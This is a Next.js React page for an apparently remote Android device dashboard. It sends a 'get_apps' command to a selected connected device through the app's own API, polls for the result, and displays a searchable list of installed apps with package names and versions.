'use client'
import { Suspense } from 'react'
import { useEffect, useState, useCallback } from 'react'
import { useSearchParams } from 'next/navigation'
import Sidebar from '@/components/Sidebar'
import { Package, RefreshCw, Circle, Search, Download } from 'lucide-react'

interface DeviceItem { deviceId: string; deviceName: string; connected: boolean }
interface AppEntry { name: string; pkg: string; version: string }

function parseApps(text: string): AppEntry[] {
  const lines = text.split('\n').filter(l => l.trim() && !l.startsWith('===') && l.includes('|'))
  return lines.map(line => {
    const parts = line.split('|').map(p => p.trim())
    return { name: parts[0] ?? '', pkg: parts[1] ?? '', version: parts[2] ?? '' }
  }).filter(e => e.name && e.pkg)
}

function AppsContent() {
  const searchParams = useSearchParams()
  const [devices, setDevices] = useState<DeviceItem[]>([])
  const [selectedId, setSelectedId] = useState<string | null>(searchParams.get('d'))
  const [apps, setApps] = useState<AppEntry[]>([])
  const [filtered, setFiltered] = useState<AppEntry[]>([])
  const [search, setSearch] = useState('')
  const [loading, setLoading] = useState(false)

  const connected = devices.find(d => d.deviceId === selectedId)?.connected ?? false

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch('/api/devices')
      const data = await res.json()
      const list: DeviceItem[] = data.devices ?? []
      setDevices(list)
      if (!selectedId && list.length > 0) setSelectedId((list.find(d => d.connected) ?? list[0]).deviceId)
    } catch {}
  }, [selectedId])

  useEffect(() => { fetchDevices(); const iv = setInterval(fetchDevices, 5000); return () => clearInterval(iv) }, [fetchDevices])

  useEffect(() => {
    const q = search.toLowerCase()
    setFiltered(q ? apps.filter(a => a.name.toLowerCase().includes(q) || a.pkg.toLowerCase().includes(q)) : apps)
  }, [search, apps])

  const fetchApps = async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: 'get_apps' }),
      })
      await new Promise(r => setTimeout(r, 4000))
      for (let i = 0; i < 15; i++) {
        const r = await fetch(`/api/device/result?deviceId=${selectedId}`)
        const d = await r.json()
        const match = (d.history ?? []).find((h: {command:string;result:string}) => h.command === 'get_apps')
        if (match?.result) { const list = parseApps(match.result); setApps(list); setFiltered(list); break }
        await new Promise(r2 => setTimeout(r2, 2000))
      }
    } finally { setLoading(false) }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2"><Package size={20} className="text-android-green" /> Installed Apps</h2>
              <p className="text-android-muted text-xs mt-0.5">Browse user-installed apps on the device</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />{connected ? 'Online' : 'Offline'}
            </div>
          </div>

          <div className="flex gap-2 mb-4">
            {apps.length > 0 && (
              <div className="flex-1 flex items-center gap-2 bg-android-surface border border-android-border rounded-lg px-3 py-2">
                <Search size={14} className="text-android-muted shrink-0" />
                <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search apps or package name…"
                  className="flex-1 bg-transparent text-android-text text-xs outline-none placeholder:text-android-muted/50" />
              </div>
            )}
            <button onClick={fetchApps} disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed shrink-0">
              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
              {loading ? 'Fetching…' : 'Fetch Apps'}
            </button>
          </div>

          {!connected && <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl"><Package size={32} className="mx-auto mb-3 text-android-border" />Connect a device to list apps</div>}

          {connected && apps.length === 0 && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Package size={32} className="mx-auto mb-3 text-android-border" /><p>Click "Fetch Apps" to list installed apps</p>
            </div>
          )}

          {filtered.length > 0 && (
            <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
              <div className="px-4 py-2.5 border-b border-android-border text-xs text-android-muted">
                {filtered.length} {search ? 'results' : 'apps'} {apps.length > 0 && search ? `of ${apps.length}` : ''}
              </div>
              <div className="divide-y divide-android-border/50">
                {filtered.map((app, i) => (
                  <div key={i} className="flex items-center gap-3 px-4 py-3 hover:bg-white/5">
                    <div className="w-9 h-9 rounded-xl bg-android-green/10 border border-android-green/20 flex items-center justify-center shrink-0">
                      <span className="text-android-green text-sm font-bold">{app.name[0]?.toUpperCase() ?? '?'}</span>
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-android-text text-sm font-semibold truncate">{app.name}</p>
                      <p className="text-android-muted text-xs font-mono truncate">{app.pkg}</p>
                    </div>
                    <span className="text-android-muted text-xs shrink-0">{app.version}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function AppsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <AppsContent />
    </Suspense>
  )
}
